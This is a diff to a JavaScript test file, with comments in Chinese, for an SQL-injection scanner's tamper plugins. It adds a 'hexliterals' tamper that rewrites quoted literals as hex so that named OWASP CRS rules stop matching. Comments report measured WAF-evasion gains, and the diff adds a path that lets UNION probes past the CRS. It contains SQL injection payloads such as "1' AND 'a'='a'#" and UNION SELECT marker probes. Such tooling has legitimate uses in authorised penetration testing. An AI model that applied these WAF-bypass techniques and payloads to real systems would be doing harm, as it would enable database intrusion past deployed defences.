@@ -279,12 +279,56 @@ test('tamper 绕过 WAF：symboliclogical 将逻辑关键字变形绕过', () =>
   assert.equal(wafBlocksLogical(out), false);
 });
 
-// v12 全量注册校验：90 个插件全部已注册且可解析
-test('v24：全部 225 个 tamper 均已注册且可解析', () => {
-  assert.equal(tamperRegistry.list().length, 225);
+// v12 全量注册校验：全部插件均已注册且可解析
+// 计数沿革：225 → 227（logicalops / mysqlversioncomment）→ 228（dash2hash）→ 227
+// [CRS-FIX 2026-09-09] 227：移除 logicalops（与 symboliclogical 逐字节重复，且 && 被 CRS 942120 定点检测）
+//   与 mysqlversioncomment（/*!50000KW*/ 被 CRS 942500 定点检测，启用后反而多命中一条规则），
+//   新增 hexliterals（'abc'→0x616263，消除引号锚点以绕开 CRS 942511/942200/942370）。
+test('v24+：全部 228 个 tamper 均已注册且可解析', () => {
+  assert.equal(tamperRegistry.list().length, 228);
   for (const n of ALL_NAMES) {
     assert.equal(tamperRegistry.resolve([n]).length, 1, `无法解析: ${n}`);
   }
+});
+
+// —— CRS v4.1.0 针对性变体：hexliterals（'abc' → 0x616263）——
+// 依据：CRS 942511 / 942200 / 942370 均以「引号」为锚点；MySQL 中 'abc' 与 0x616263 完全等价，
+// 去掉引号即抽掉锚点。动态实测（e2e/waf-real）下 942511/942200 命中数归零，被拦请求 382 → 365。
+test('hexliterals：词字符字面量转 0x，注入闭合引号不被误伤', () => {
+  const p = tamperRegistry.get('hexliterals');
+  // 闭合引号 ' 后紧跟空格 → 不构成「纯词字符字面量」，原样保留（本插件不破坏 payload 的关键）
+  assert.equal(p.transform("1' AND 'a'='a'#"), "1' AND 0x61=0x61#");
+  assert.equal(p.transform("1 UNION SELECT 'SQLISCANNER0','SQLISCANNER1'"),
+    '1 UNION SELECT 0x53514c495343414e4e455230,0x53514c495343414e4e455231');
+  assert.equal(p.transform("CONCAT('__S__',version())"), 'CONCAT(0x5f5f535f5f,version())');
+});
+
+test('hexliterals：含非词字符 / 纯数字的字面量不转换（保语义）', () => {
+  const p = tamperRegistry.get('hexliterals');
+  // '%alice%'：含 % → 不转，否则破坏 LIKE 语义
+  assert.equal(p.transform("name LIKE '%alice%'"), "name LIKE '%alice%'");
+  // '1'：纯数字不转 —— LIMIT/算术上下文里 0x31 不是合法整型字面量
+  assert.equal(p.transform("1' ORDER BY '1'#"), "1' ORDER BY '1'#");
+});
+
+test('hexliterals：doctest 全部通过', () => {
+  const p = tamperRegistry.get('hexliterals');
+  for (const d of p.doctests) {
+    assert.equal(p.transform(d.input), d.output, `doctest 失败: ${d.input}`);
+  }
+});
+
+// —— markerSafe 通道：允许「标记语义无损」的 tamper 变形提取标记 ——
+// 背景：占位保护会挡住一切标记变形，导致 UNION 列探测在 CRS 下 100% 被拦（实测 union 检出 0）。
+test('markerSafe：链上全部插件声明 markerSafe → 跳过占位保护，标记可被语义等价变形', () => {
+  const out = applyTampers("1 UNION SELECT 'SQLISCANNER0'", { dbms: 'MySQL', config: {} }, ['hexliterals']);
+  assert.match(out, /0x53514c495343414e4e455230/); // 回显内容不变，仅去掉引号
+});
+
+test('markerSafe：混合链（含未声明插件）仍走占位保护，标记原样还原', () => {
+  const out = applyTampers("1 UNION SELECT 'SQLISCANNER0'", { dbms: 'MySQL', config: {} }, ['hexliterals', 'lowercase']);
+  assert.ok(out.includes('SQLISCANNER0'), `标记被破坏: ${out}`);
+  assert.ok(out.startsWith('1 union select'), `小写化未生效: ${out}`);
 });
 
 // —— P3：space2comment 引号状态机（跳过字符串字面量/注释区内空格，修复破坏 payload 语义的 bug）——
